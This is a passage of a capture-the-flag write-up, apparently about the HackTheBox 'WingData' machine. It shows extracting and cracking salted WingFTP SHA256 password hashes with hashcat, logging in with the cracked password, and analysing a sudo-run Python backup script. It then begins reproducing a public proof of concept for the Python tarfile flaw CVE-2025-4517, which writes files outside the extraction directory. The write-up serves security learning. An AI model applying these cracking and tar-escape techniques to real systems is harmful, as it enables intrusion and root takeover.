+./1/settings.xml:    &lt;SaltingString&gt;WingFTP&lt;/SaltingString&gt;
+./settings.xml:    &lt;ServerPassword&gt;2D35A8D420A697203D7C554A678F8119&lt;/ServerPassword&gt;
+</span></code></pre></div></div>
+
+<h3 id="recover-password">Recover Password</h3>
+
+<h4 id="format-data">Format Data</h4>
+
+<p>A little Bash foo makes a nicely formatted set of passwords:</p>
+
+<div class="language-console wrapall highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"&lt;Password&gt;"</span> <span class="nb">.</span> | <span class="nb">sed</span> <span class="nt">-E</span> <span class="s1">'s#.*/([^/]+)\.xml:.*&lt;[^&gt;]+&gt;([0-9a-fA-F]+)&lt;/[^&gt;]+&gt;.*#\1:\2#'</span>
+<span class="go">admins:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
+maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
+steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
+wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+anonymous:d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
+john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
+</span></code></pre></div></div>
+
+<p>Looking at the length of each password, they are each 64 hex characters, which means they are likely SHA256. In fact, the settings file in the <code class="language-plaintext highlighter-rouge">1</code> directory specifies that:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span><span class="nb">cat </span>1/settings.xml | <span class="nb">grep </span>SHA
+<span class="go">    &lt;EnableSHA256&gt;1&lt;/EnableSHA256&gt;
+</span></code></pre></div></div>
+
+<p>This is also in the <a href="https://www.wftpserver.com/help/ftpserver/index.html?compression.htm">WingFTP documentation</a>. When that option is disabled it will use MD5.</p>
+
+<p>The output above also showed that there is a salt of “WingFTP”. Another <a href="https://www.wftpserver.com/help/ftpserver/index.html?user__group.htm">documentation page</a> shows that the passwords are stored as “SHA256(Password+SaltString)”.</p>
+
+<p>Hashcat has in it’s <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">example hashes page</a> page mode 1410:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1410	sha256($pass.$salt)	c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4:53743528
+</code></pre></div></div>
+
+<p>A slight update to the <code class="language-plaintext highlighter-rouge">sed</code> command above gets:</p>
+
+<div class="language-console wrapall highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/opt/wftpserver/Data$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"&lt;Password&gt;"</span> <span class="nb">.</span> | <span class="nb">sed</span> <span class="nt">-E</span> <span class="s1">'s#.*/([^/]+)\.xml:.*&lt;[^&gt;]+&gt;([0-9a-fA-F]+)&lt;/[^&gt;]+&gt;.*#\1:\2:WingFTP#'</span> | <span class="nb">tee </span>wingftp.hashes
+<span class="go">admins:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP
+maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
+steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
+wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
+anonymous:d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP
+john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
+</span></code></pre></div></div>
+
+<p>I’ll save those to a file.</p>
+
+<h4 id="crack">Crack</h4>
+
+<p>I’ll run these hashes through <code class="language-plaintext highlighter-rouge">hashcat</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat <span class="nt">-m</span> 1410 <span class="nt">--user</span> wingftp.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+<span class="go">hashcat (v7.1.2) starting
+...[snip]...
+d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP:
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+...[snip]...
+</span></code></pre></div></div>
+
+<p>It cracks both anonymous (empty password) and wacky.</p>
+
+<h3 id="su--ssh">su / SSH</h3>
+
+<p>The password works for the wacky user both with <code class="language-plaintext highlighter-rouge">su</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wingftp@wingdata:/$</span><span class="w"> </span>su - wacky
+<span class="go">Password: 
+</span><span class="gp">wacky@wingdata:~$</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And over SSH:</p>
+
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'!#7Blushing^*Bride5'</span> ssh wacky@wingdata.htb
+<span class="go">Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64
+...[snip]...
+</span><span class="gp">wacky@wingdata:~$</span><span class="w"> 
+</span></code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<h3 id="enumeration-1">Enumeration</h3>
+
+<h4 id="sudo">sudo</h4>
+
+<p>I already noted that wacky had access to <code class="language-plaintext highlighter-rouge">/opt/backup_clients</code> whereas wingftp didn’t. It turns out there’s a Python script in there that wacky can run as root without a password using <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+</span></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">/opt/backup_clients</code> directory has that Python script plus two empty directories:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:/opt/backup_clients$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backups  restore_backup_clients.py  restored_backups
+</span></code></pre></div></div>
+
+<p>I can run it to see what happens:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:/opt/backup_clients$</span><span class="w"> </span><span class="nb">sudo</span> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py <span class="nt">-h</span>
+<span class="go">usage: restore_backup_clients.py [-h] -b BACKUP -r RESTORE_DIR
+
+Restore client configuration from a validated backup tarball.
+
+options:
+  -h, --help            show this help message and exit
+  -b BACKUP, --backup BACKUP
+                        Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, where &lt;client_id&gt; is a positive integer,
+                        e.g., backup_1001.tar)
+  -r RESTORE_DIR, --restore-dir RESTORE_DIR
+                        Staging directory name for the restore operation. Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). Only
+                        alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).
+
+Example: sudo restore_backup_clients.py -b backup_1001.tar -r restore_john
+</span></code></pre></div></div>
+
+<h4 id="source-analysis">Source Analysis</h4>
+
+<p>The script has the following structure:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="n">tarfile</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+
+<span class="n">BACKUP_BASE_DIR</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/opt/backup_clients/backups</span><span class="sh">"</span>
+<span class="n">STAGING_BASE</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/opt/backup_clients/restored_backups</span><span class="sh">"</span>
+
+<span class="k">def</span> <span class="nf">validate_backup_name</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="p">.</span><span class="nf">fullmatch</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">^backup_\d+\.tar$</span><span class="sh">"</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">client_id</span> <span class="o">=</span> <span class="n">filename</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">_</span><span class="sh">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">'</span><span class="s">.tar</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">client_id</span><span class="p">.</span><span class="nf">isdigit</span><span class="p">()</span> <span class="ow">and</span> <span class="n">client_id</span> <span class="o">!=</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span>
+
+<span class="k">def</span> <span class="nf">validate_restore_tag</span><span class="p">(</span><span class="n">tag</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">bool</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">fullmatch</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">^[a-zA-Z0-9_]{1,24}$</span><span class="sh">"</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">validate_backup_name</code> makes sure that the filename is <code class="language-plaintext highlighter-rouge">backup_&lt;digits&gt;.tar</code> with nothing else. <code class="language-plaintext highlighter-rouge">&lt;digits&gt;</code> has to be only digits.</p>
+
+<p><code class="language-plaintext highlighter-rouge">validate_restore_tag</code> requires that the tag is between 1 and 24 letters, numbers, and underscore.</p>
+
+<p>The start of <code class="language-plaintext highlighter-rouge">main</code> is all parsing and validating arguments:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span>
+        <span class="n">description</span><span class="o">=</span><span class="sh">"</span><span class="s">Restore client configuration from a validated backup tarball.</span><span class="sh">"</span><span class="p">,</span>
+        <span class="n">epilog</span><span class="o">=</span><span class="sh">"</span><span class="s">Example: sudo %(prog)s -b backup_1001.tar -r restore_john</span><span class="sh">"</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span>
+        <span class="sh">"</span><span class="s">-b</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--backup</span><span class="sh">"</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+        <span class="nb">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, </span><span class="sh">"</span>
+             <span class="sh">"</span><span class="s">where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)</span><span class="sh">"</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span>
+        <span class="sh">"</span><span class="s">-r</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--restore-dir</span><span class="sh">"</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+        <span class="nb">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Staging directory name for the restore operation. </span><span class="sh">"</span>
+             <span class="sh">"</span><span class="s">Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). </span><span class="sh">"</span>
+             <span class="sh">"</span><span class="s">Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).</span><span class="sh">"</span>
+    <span class="p">)</span>
+
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="nf">validate_backup_name</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">backup</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">backup_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">BACKUP_BASE_DIR</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">backup</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">isfile</span><span class="p">(</span><span class="n">backup_path</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Backup file not found: </span><span class="si">{</span><span class="n">backup_path</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="p">.</span><span class="n">restore_dir</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">restore_</span><span class="sh">"</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] --restore-dir must start with </span><span class="sh">'</span><span class="s">restore_</span><span class="sh">'"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">tag</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">restore_dir</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">tag</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] --restore-dir must include a non-empty tag after </span><span class="sh">'</span><span class="s">restore_</span><span class="sh">'"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="nf">validate_restore_tag</span><span class="p">(</span><span class="n">tag</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The user can control the backup directory and the restore directory, with the constraints discussed above. It’s using <code class="language-plaintext highlighter-rouge">os.path.join</code>, which is typically a target for directory traversals. Because the <code class="language-plaintext highlighter-rouge">backup</code> filename is so restricted, I don’t see a way to abuse that.</p>
+
+<p>The restore directory is checked that it starts with “restore_” and after that is a valid “tag”, containing only letters, numbers, and underscore. This makes path attacks impractical.</p>
+
+<p>Then it builds the restore directory path and decompresses into that path:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">staging_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">STAGING_BASE</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">restore_dir</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Backup: </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">backup</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Staging directory: </span><span class="si">{</span><span class="n">staging_dir</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">staging_dir</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">tarfile</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">backup_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">tar</span><span class="p">:</span>
+            <span class="n">tar</span><span class="p">.</span><span class="nf">extractall</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">staging_dir</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sh">"</span><span class="s">data</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Extraction completed in </span><span class="si">{</span><span class="n">staging_dir</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">except </span><span class="p">(</span><span class="n">tarfile</span><span class="p">.</span><span class="n">TarError</span><span class="p">,</span> <span class="nb">OSError</span><span class="p">,</span> <span class="nb">Exception</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Error during extraction: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>It’s worth noting that the <code class="language-plaintext highlighter-rouge">tar.extractall()</code> call passes <code class="language-plaintext highlighter-rouge">filter="data"</code>, a new <a href="https://docs.python.org/3/library/tarfile.html#extraction-filters">feature</a> added in Python 3.12. It takes the following options:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">fully_trusted</code> - Honor all metadata as specified in the archive. Should be used if the user trusts the archive completely, or implements their own complex verification.</li>
+  <li><code class="language-plaintext highlighter-rouge">tar</code> - Honor most <em>tar</em>-specific features (i.e. features of UNIX-like filesystems), but block features that are very likely to be surprising or malicious.</li>
+  <li><code class="language-plaintext highlighter-rouge">data</code> - Ignore or block most features specific to UNIX-like filesystems. Intended for extracting cross-platform data archives.</li>
+</ul>
+
+<h4 id="python">Python</h4>
+
+<p>The python version on the box is 3.12.3:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:/$</span><span class="w"> </span>python3 <span class="nt">--version</span>
+<span class="go">Python 3.12.3
+</span></code></pre></div></div>
+
+<p>It’s also in a really unusual location:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:~$</span><span class="w"> </span>which python3
+<span class="go">/usr/local/bin/python3
+</span></code></pre></div></div>
+
+<p>That means this is a locally-compiled/installed binary, not a system package, which would be in <code class="language-plaintext highlighter-rouge">/usr/bin</code>. In fact, there is a copy there as well:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/python3<span class="k">*</span>
+<span class="go">lrwxrwxrwx 1 root root      10 Apr  9  2023 /usr/bin/python3 -&gt; python3.11
+-rwxr-xr-x 1 root root 6831736 Apr 28  2025 /usr/bin/python3.11
+</span></code></pre></div></div>
+
+<p>The Python 3.11 in <code class="language-plaintext highlighter-rouge">/usr/bin</code> is Debian 12’s installed Python. The Python is <code class="language-plaintext highlighter-rouge">/usr/local/bin</code> was built there likely using the <code class="language-plaintext highlighter-rouge">make install</code> command, leaving <code class="language-plaintext highlighter-rouge">-config</code> files behind:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/python3<span class="k">*</span>
+<span class="go">lrwxrwxrwx 1 root root       10 Nov  3  2025 /usr/local/bin/python3 -&gt; python3.12
+-rwxr-xr-x 1 root root 31280440 Nov  3  2025 /usr/local/bin/python3.12
+-rwxr-xr-x 1 root root     3026 Nov  3  2025 /usr/local/bin/python3.12-config
+lrwxrwxrwx 1 root root       17 Nov  3  2025 /usr/local/bin/python3-config -&gt; python3.12-config
+</span></code></pre></div></div>
+
+<p>The fact that this is a 32MB binary also suggests it’s statically compiled (not that that’s important to solving WingData).</p>
+
+<h3 id="cve-2025-4517">CVE-2025-4517</h3>
+
+<h4 id="identify">Identify</h4>
+
+<p>Reading the script above, my first thought is that I should be able to do some kind of arbitrary write. But the script has this locked down very well. I can’t really control the input or output names enough to do anything useful, and the tar extraction seems to be done safely.</p>
+
+<p>It does seem clear that tar has something to do with it, and the Python version is important.</p>
+
+<p>Searching for “python 3.12.3 tarfile cve” returns information on several 2025 CVEs:</p>
+
+<picture>
+    <source type="image/webp" srcset="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260619083648444.webp" />
+    <img loading="lazy" src="https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260619083648444.png" alt="image-20260619083648444" class="include_image " />
+</picture>
+
+<p>There were five CVEs disclosed in a single <a href="https://mail.python.org/archives/list/security-announce@python.org/thread/MAXIJJCUUMCL7ATZNDVEGGHUMQMUUKLG/">post</a> by Seth Larson:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>CVE</th>
+      <th>Severity</th>
+      <th>Primitive</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>CVE-2025-4517</td>
+      <td>Critical</td>
+      <td>Arbitrary file write (with contents) outside the extraction dir, via a <code class="language-plaintext highlighter-rouge">realpath</code>/<code class="language-plaintext highlighter-rouge">PATH_MAX</code> overflow</td>
+    </tr>
+    <tr>
+      <td>CVE-2025-4330</td>
+      <td>High</td>
+      <td>Symlink whose target points outside the dir, plus some metadata modification</td>
+    </tr>
+    <tr>
+      <td>CVE-2025-4138</td>
+      <td>High</td>
+      <td>Creates a symlink itself outside the extraction dir</td>
+    </tr>
+    <tr>
+      <td>CVE-2025-4435</td>
+      <td>High</td>
+      <td>With <code class="language-plaintext highlighter-rouge">errorlevel=0</code>, filtered members are extracted instead of skipped</td>
+    </tr>
+    <tr>
+      <td>CVE-2024-12718</td>
+      <td>Moderate</td>
+      <td>Modify metadata/permissions of files outside the extraction dir</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The interesting one here is CVE-2025-4517, which gives a direct arbitrary file write as the user running the script.</p>
+
+<h4 id="details">Details</h4>
+
+<p>NIST describes <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4517">CVE-2025-4517</a> as:</p>
+
+<blockquote>
+  <p>Allows arbitrary filesystem writes outside the extraction directory during extraction with filter=”data”. You are affected by this vulnerability if using the tarfile module to extract untrusted tar archives using TarFile.extractall() or TarFile.extract() using the filter= parameter with a value of “data” or “tar”. See the tarfile extraction filters documentation https://docs.python.org/3/library/tarfile.html#tarfile-extraction-filter  for more information. Note that for Python 3.14 or later the default value of filter= changed from “no filtering” to `“data”, so if you are relying on this new default behavior then your usage is also affected. Note that none of these vulnerabilities significantly affect the installation of source distributions which are tar archives as source distributions already allow arbitrary code execution during the build process. However when evaluating source distributions it’s important to avoid installing source distributions with suspicious links.</p>
+</blockquote>
+
+<p>The <code class="language-plaintext highlighter-rouge">data</code> filter is supposed to guarantee that no extracted member (or link target) escapes the destination directory. For link members it does a containment check that boils down to resolving the target with <code class="language-plaintext highlighter-rouge">os.path.realpath()</code> and confirming the result is still inside the extraction directory.</p>
+
+<p><code class="language-plaintext highlighter-rouge">os.path.realpath()</code> walks the path component by component, and when a component is a symlink it <code class="language-plaintext highlighter-rouge">lstat</code>s it and follows it. Crucially, it runs in non-strict mode, so if an OS call fails, it does not fail, but silently stops resolving and appends the remaining components literally.</p>
+
+<p>If I can force the path being resolved to blow past <code class="language-plaintext highlighter-rouge">PATH_MAX</code> <em>before</em> <code class="language-plaintext highlighter-rouge">realpath</code> reaches the malicious symlink, that symlink never gets followed during the check. The filter sees a literal, inside-the-destination-looking path and approves it, but the real filesystem operations during extraction <em>do</em> follow the link, landing outside.</p>
+
+<p><a href="https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f">This</a> GitHub advisory on the vulnerability has details and a POC. It starts with “hello world” in <code class="language-plaintext highlighter-rouge">flag/flag</code> and no other files in <code class="language-plaintext highlighter-rouge">flag/</code>. The POC’s job is to manufacture a path long enough to trip <code class="language-plaintext highlighter-rouge">ENAMETOOLONG</code> at exactly the right spot to overwrite <code class="language-plaintext highlighter-rouge">flag/flag</code> and write a new file into <code class="language-plaintext highlighter-rouge">flag</code>.</p>
+
+<p>The POC builds the malicious archive in <code class="language-plaintext highlighter-rouge">poc.tar</code>. First it picks the component sizes and builds a chain of long directories and symlinks:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">tarfile</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">io</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="c1"># 247 (55 on OSX) picked so the expanded path of dirs is 3968 bytes long (or 896
+# on OSX), leaving 128 bytes for a prefix and at least a few chars of the link
+</span><span class="n">comp</span> <span class="o">=</span> <span class="sh">'</span><span class="s">d</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">55</span> <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">platform</span> <span class="o">==</span> <span class="sh">'</span><span class="s">darwin</span><span class="sh">'</span> <span class="k">else</span> <span class="mi">247</span><span class="p">)</span>
+<span class="n">steps</span> <span class="o">=</span> <span class="sh">"</span><span class="s">abcdefghijklmnop</span><span class="sh">"</span>
+<span class="n">path</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="k">with</span> <span class="n">tarfile</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">poc.tar</span><span class="sh">"</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="sh">"</span><span class="s">x</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">tar</span><span class="p">:</span>
+    <span class="c1"># populate the symlinks and dirs that expand in os.path.realpath()
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">steps</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">comp</span><span class="p">))</span>
+        <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">DIRTYPE</span>
+        <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
